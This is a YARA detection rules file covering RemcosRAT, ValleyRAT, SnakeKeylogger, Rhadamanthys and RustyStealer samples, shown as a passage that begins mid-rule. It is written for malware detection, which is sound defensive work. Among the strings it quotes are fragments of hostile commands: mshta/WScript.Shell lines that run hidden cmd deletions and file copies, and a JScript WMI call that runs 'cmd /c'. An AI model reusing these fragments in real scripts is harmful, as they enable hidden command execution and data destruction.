      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "Oqmnczbkx.exe" fullword wide /* score: '22.00'*/
      $s4 = "DOqmnczbkx, Version=1.0.4688.67, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s6 = "\\{\\59\\" fullword ascii /* score: '10.00'*/ /* hex encoded string 'Y' */
      $s7 = ".NET Framework 4.6l" fullword ascii /* score: '10.00'*/
      $s8 = "* Pj[`" fullword ascii /* score: '9.00'*/
      $s9 = "EtFTp\\B" fullword ascii /* score: '9.00'*/
      $s10 = "~(|\\_/$:~3d" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s11 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s12 = "fefeffefefe" ascii /* score: '8.00'*/
      $s13 = "affefeeffe" ascii /* score: '8.00'*/
      $s14 = "fefeffeefa" ascii /* score: '8.00'*/
      $s15 = "affefefeeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__366021eb {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_366021eb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "366021ebe0e04258caa4cc6ce5620021b3da7c0fbdc642a0f7631a556d7f3630"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "<re-60, Version=5.5.3.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s4 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s5 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s6 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s7 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s8 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s9 = "re-60.exe" fullword wide /* score: '16.00'*/
      $s10 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s11 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s12 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s13 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s14 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s15 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2c0cfe1cf39f794b0097fe3257b9615a52207910557b76dec822f5540463574"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash__acef4ddd {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash)_acef4ddd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "acef4dddd9c38e517b707ad8d3777df9e4a3849b78206308ddeca84facae49e3"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash__db53b8fa {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash)_db53b8fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db53b8facfc960e2654dd0d69f34f9a8c8f2d4344addde1d41cf3f84ef83dc5a"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "ihziepulgned" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2bd14b96 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2bd14b96.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2bd14b966dec6792a03cd2925460702e0a83da7d3d4b3461eac8f01c78cc1326"
   strings:
      $s1 = "IAcU.exe" fullword wide /* score: '22.00'*/
      $s2 = "IAcU.pdb" fullword ascii /* score: '14.00'*/
      $s3 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s4 = "PatternGenerator.Forms.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s5 = "Error exporting pattern: " fullword wide /* score: '10.00'*/
      $s6 = "GetImageFormat" fullword ascii /* score: '9.00'*/
      $s7 = "GetQualityValue" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2f76a219 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f76a219.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f76a21937582bd59783cab01437d029a6ccd52635e2a3f424831ad7e444e640"
   strings:
      $s1 = "KmVz.exe" fullword wide /* score: '22.00'*/
      $s2 = "KmVz.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Yyg9RWdwK" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s4 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s5 = "PatternGenerator.Forms.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s6 = "Error exporting pattern: " fullword wide /* score: '10.00'*/
      $s7 = "GetImageFormat" fullword ascii /* score: '9.00'*/
      $s8 = "GetQualityValue" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash__b2437acd {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash)_b2437acd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2437acd794a51d547eddf50d42a6eabf2f90b49fef333eae84332c873f5efb3"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "daa3ae9f7d210ac7f61ec03bdc3955c098f8902ed353577752b747de107933ee"
   strings:
      $s1 = "TencentdBxmgTNZ.exe" fullword wide /* score: '22.00'*/
      $s2 = "RSJLRSJOMSJ" fullword ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s5 = "7777777777777.A@$77" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wwwwwwzw' */
      $s6 = "denglupeizhi" fullword ascii /* score: '8.00'*/
      $s7 = "aaaaadddddddddd" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__3f61f262 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_3f61f262.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3f61f2626ae164481484e1145ab87bf220e38f7dfd425fd3e533f03803a44189"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__8ff7bf8d {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_8ff7bf8d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8ff7bf8dfda2d9edd97a9793a4cc24970b7ddb6661e545b159dbdaaccd029299"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__b34998b5 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_b34998b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b34998b5835cd4ae700f598e1f6f04de187b7961c70d6ab0bcb739e445511664"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__2 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b02256544a6763f6abe0c6a7f6bc5bcd155252fa3936659a806b69ff3157f2ba"
   strings:
      $s1 = "Launcher.exe" fullword ascii /* score: '22.00'*/
      $s2 = "\\\",\\58" fullword ascii /* score: '10.00'*/ /* hex encoded string 'X' */
      $s3 = "~,}2}4}<}" fullword ascii /* score: '9.00'*/ /* hex encoded string '$' */
      $s4 = "3#\"\"\\f" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s5 = "* E-)j" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 12000KB and
      all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1b35dcf34e3ad95f8148543349418a51fa31eaa37a807d9d2ddedd56a54bfd57"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s7 = "OvZPs -vHG" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__a653b194 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_a653b194.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a653b19403d6a9f814130e4ca97194b9eade03575239d07bf00a225c9d012961"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "Harbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic" ascii /* score: '12.00'*/
      $s6 = "ogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor" ascii /* score: '12.00'*/
      $s7 = "es air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistic" ascii /* score: '12.00'*/
      $s8 = "or Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic Sky" ascii /* score: '12.00'*/
      $s9 = "c SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems Sky" ascii /* score: '12.00'*/
      $s10 = " Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages" ascii /* score: '12.00'*/
      $s11 = " SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air tra" ascii /* score: '12.00'*/
      $s12 = "ics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Mana" ascii /* score: '12.00'*/
      $s13 = "affic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems" ascii /* score: '12.00'*/
      $s14 = "SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traf" ascii /* score: '12.00'*/
      $s15 = "tems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__cd00e968 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_cd00e968.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd00e9684bb6a8b2b5ea0699b89cb251221c343cfb6ab3f6ec57525b349fc25f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "JOAK:\"r" fullword ascii /* score: '10.00'*/
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s7 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s8 = "GQcbvgUBSpy" fullword ascii /* score: '9.00'*/
      $s9 = "a5, -kf+ " fullword ascii /* score: '9.00'*/
      $s10 = "*  wCS" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d83fe25c47771ebd5932b0e4f7826176f460d37de660452d8f1472b31576593"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "\\\",\\58" fullword ascii /* score: '10.00'*/ /* hex encoded string 'X' */
      $s6 = "~,}2}4}<}" fullword ascii /* score: '9.00'*/ /* hex encoded string '$' */
      $s7 = "* E-)j" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RustyStealer_signature__2 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed797beb927738d68378cd718ea0dc74e605df0e66bd5670f557217720fb2871"
   strings:
      $x1 = "NameTableTypeColumnIdentifier_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyTableMaxValueNullableKeyColu" ascii /* score: '69.00'*/
      $x2 = "ForceDeleteFolderTARGETDIRmshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd /c rmdir /s /q \"\"[INSTALLDIR]\"\"\",0,true)" ascii /* score: '36.00'*/
      $x3 = "&dt record.ComponentIdGuidA string GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Dir" ascii /* score: '35.00'*/
      $x4 = "reateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[LocalAppDataFolder]LOG\"\" copy /Y \"\"[LocalAppDataFolder]LOG\"\" \"" ascii /* score: '34.00'*/
      $x5 = "alAppDataFolder]av.dat\"\"\",0,true)(window.close)RestoreAndDeleteFile3mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd " ascii /* score: '34.00'*/
      $x6 = ".Run(\"cmd /c if exist \"\"[LocalAppDataFolder]av.dat\"\" copy /Y \"\"[LocalAppDataFolder]av.dat\"\" \"\"[INSTALLDIR]av.dat\"\" " ascii /* score: '33.00'*/
      $x7 = "ript:CreateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[INSTALLDIR]av.dat\"\" copy /Y \"\"[INSTALLDIR]av.dat\"\" \"\"[Lo" ascii /* score: '33.00'*/
      $x8 = "eam. The binary icon data in PE (.DLL or .EXE) or icon (.ICO) format.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary k" ascii /* score: '33.00'*/
      $x9 = "cruntime140.dll14.32.31326.0VCRunTime1srm5ihny.dll|vcruntime140_1.dllInstallerIconFindRelatedProductsValidateProductIDProcessCom" ascii /* score: '33.00'*/
      $x10 = "on.AdminUISequenceAdvtExecuteSequenceComponentPrimary key used to identify a particular component record.ComponentIdGuidA string" ascii /* score: '31.00'*/
      $x11 = "ultFeatureabut2otu.exe|ManualFinderApp.exe2.0.196.01033WebView2qbz-rkcp.dll|WebView2Loader.dll1.0.3351.48VCRunTimeogx91y4r.dll|v" ascii /* score: '31.00'*/
      $x12 = "eateObject(\"WScript.Shell\").Run(\"\"\"[INSTALLDIR]ManualFinderApp.exe\"\" /bg\",0,false)(window.close)KillAppProcessSystemFold" ascii /* score: '31.00'*/
      $s13 = "der]av.dat\"\"\",0,true)(window.close)BackupFile3mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[INSTA" ascii /* score: '30.00'*/
      $s14 = "close)SetInstallParentLocalAppDataFolder[LocalAppDataFolder]BackupFile1mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd " ascii /* score: '29.00'*/
      $s15 = "vbscript:CreateObject(\"WScript.Shell\").Run(\"taskkill /F /IM ManualFinderApp.exe\",0,true)(window.close)RunAppWithAvunMainEXE/" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__a67bbf80 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_a67bbf80.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a67bbf80bdf9f555d4342716a9f240526f8e6bde9674bd0574c5a1bc8bd61f12"
   strings:
      $s1 = "61,50,55,56,58,62,61,50,55,56,58,62,62,50,63,61,62,63,50,63,62,63,54,50,55,54,55,59,63,50,63,62,63,55,50,55,54,54,59,57,50,55,54" ascii /* score: '9.00'*/ /* hex encoded string 'aPUVXbaPUVXbbPcabcPcbcTPUTUYcPcbcUPUTTYWPUT' */
      $s2 = "55,54,55,60,62,50,55,54,55,60,55,50,62,62,60,55,50,55,54,54,59,63,50,63,62,61,59,50,62,62,54,62,50,55,54,54,59,54,50,63,61,62,62" ascii /* score: '9.00'*/ /* hex encoded string 'UTU`bPUTU`UPbb`UPUTTYcPcbaYPbbTbPUTTYTPcabb' */
      $s3 = "56,50,63,62,61,63,50,55,54,55,59,58,50,63,62,62,63,50,63,62,57,57,50,62,61,59,57,50,55,54,54,57,59,50,63,60,61,59,50,55,54,55,61" ascii /* score: '9.00'*/ /* hex encoded string 'VPcbacPUTUYXPcbbcPcbWWPbaYWPUTTWYPc`aYPUTUa' */
      $s4 = "61,58,59,50,63,62,61,62,50,55,62,54,50,55,54,55,60,59,50,62,62,60,56,50,63,62,63,56,50,63,62,57,56,50,63,62,63,63,50,55,54,54,62" ascii /* score: '9.00'*/ /* hex encoded string 'aXYPcbabPUbTPUTU`YPbb`VPcbcVPcbWVPcbccPUTTb' */
      $s5 = "58,50,55,54,54,57,56,50,55,54,54,59,54,50,55,62,54,50,55,57,50,59,54,50,59,54,50,57,59,50,63,60,63,59,50,63,61,60,55,50,55,54,54" ascii /* score: '9.00'*/ /* hex encoded string 'XPUTTWVPUTTYTPUbTPUWPYTPYTPWYPc`cYPca`UPUTT' */
      $s6 = "55,60,55,50,63,60,61,59,50,63,60,59,57,50,55,54,55,59,61,50,55,54,54,59,56,50,55,57,50,59,54,50,59,54,50,57,59,50,63,60,59,58,50" ascii /* score: '9.00'*/ /* hex encoded string 'U`UPc`aYPc`YWPUTUYaPUTTYVPUWPYTPYTPWYPc`YXP' */
      $s7 = "62,63,58,50,63,61,57,56,50,63,61,57,57,50,63,62,63,60,50,63,61,59,61,50,63,62,57,61,50,55,54,55,59,60,50,55,54,54,57,60,50,55,54" ascii /* score: '9.00'*/ /* hex encoded string 'bcXPcaWVPcaWWPcbc`PcaYaPcbWaPUTUY`PUTTW`PUT' */
      $s8 = "50,55,54,54,56,63,50,55,56,58,61,58,50,55,54,54,60,55,50,55,54,54,58,55,50,62,59,63,63,50,55,54,55,60,54,50,63,60,63,58,50,55,56" ascii /* score: '9.00'*/ /* hex encoded string 'PUTTVcPUVXaXPUTT`UPUTTXUPbYccPUTU`TPc`cXPUV' */
      $s9 = "57,60,50,55,54,55,59,57,50,62,60,54,57,50,63,63,54,57,50,55,57,50,59,54,50,59,54,50,57,59,50,55,54,54,58,57,50,55,54,54,59,63,50" ascii /* score: '9.00'*/ /* hex encoded string 'W`PUTUYWPb`TWPccTWPUWPYTPYTPWYPUTTXWPUTTYcP' */
      $s10 = "55,54,54,59,58,50,62,61,57,61,50,62,61,60,54,50,55,54,54,57,57,50,55,56,58,63,59,50,62,59,63,63,50,55,54,55,61,56,50,55,54,55,59" ascii /* score: '9.00'*/ /* hex encoded string 'UTTYXPbaWaPba`TPUTTWWPUVXcYPbYccPUTUaVPUTUY' */
      $s11 = "63,61,59,61,50,63,61,59,63,50,62,59,63,63,50,63,61,57,55,50,62,62,59,60,50,63,61,54,54,50,63,62,57,57,50,55,54,55,59,63,50,62,61" ascii /* score: '9.00'*/ /* hex encoded string 'caYaPcaYcPbYccPcaWUPbbY`PcaTTPcbWWPUTUYcPba' */
      $s12 = "50,63,62,62,55,50,63,62,61,59,50,63,62,57,61,50,63,61,57,55,50,63,57,58,50,63,62,62,60,50,55,54,54,58,61,50,55,54,54,59,55,50,55" ascii /* score: '9.00'*/ /* hex encoded string 'PcbbUPcbaYPcbWaPcaWUPcWXPcbb`PUTTXaPUTTYUPU' */
      $s13 = "60,63,57,50,63,61,58,59,50,55,57,50,59,54,50,59,54,50,57,59,50,55,54,54,59,54,50,55,54,54,57,59,50,55,56,58,63,59,50,55,54,54,57" ascii /* score: '9.00'*/ /* hex encoded string '`cWPcaXYPUWPYTPYTPWYPUTTYTPUTTWYPUVXcYPUTTW' */
      $s14 = "62,61,58,61,50,55,54,55,59,58,50,63,60,60,57,50,63,61,62,62,50,63,60,61,62,50,62,61,57,58,50,55,62,58,50,63,60,63,58,50,63,60,61" ascii /* score: '9.00'*/ /* hex encoded string 'baXaPUTUYXPc``WPcabbPc`abPbaWXPUbXPc`cXPc`a' */
      $s15 = "60,50,55,61,56,50,63,60,62,56,50,55,54,54,59,60,50,63,61,62,63,50,55,54,55,61,55,50,55,54,54,58,60,50,62,61,57,57,50,63,62,63,54" ascii /* score: '9.00'*/ /* hex encoded string '`PUaVPc`bVPUTTY`PcabcPUTUaUPUTTX`PbaWWPcbcT' */
   condition:
      uint16(0) == 0x2f2f and filesize < 7000KB and
      8 of them
}

rule SnakeKeylogger_signature__2 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7c15d5c57a85cbb55dec53514a8b0ce1e055bc5f49fb9feb2fa307d6a43f36c5"
   strings:
      $x1 = "SpectrumController.WriteLine(\":: 4mU8R71CBWLkgbjl9Ox9q6Cx2IQQ3q9PPabhAK8kpqy0lKxFrxQ29SH2aWqg8qHFhagiDgooh3iQhvD0HdjdGPTrNHTOzN" ascii /* score: '44.00'*/
      $s2 = "GetObject(ArtificialDaemon).Get(MatrixServer).Create('cmd /c ' + VectorHub, null, null, null);" fullword ascii /* score: '29.00'*/
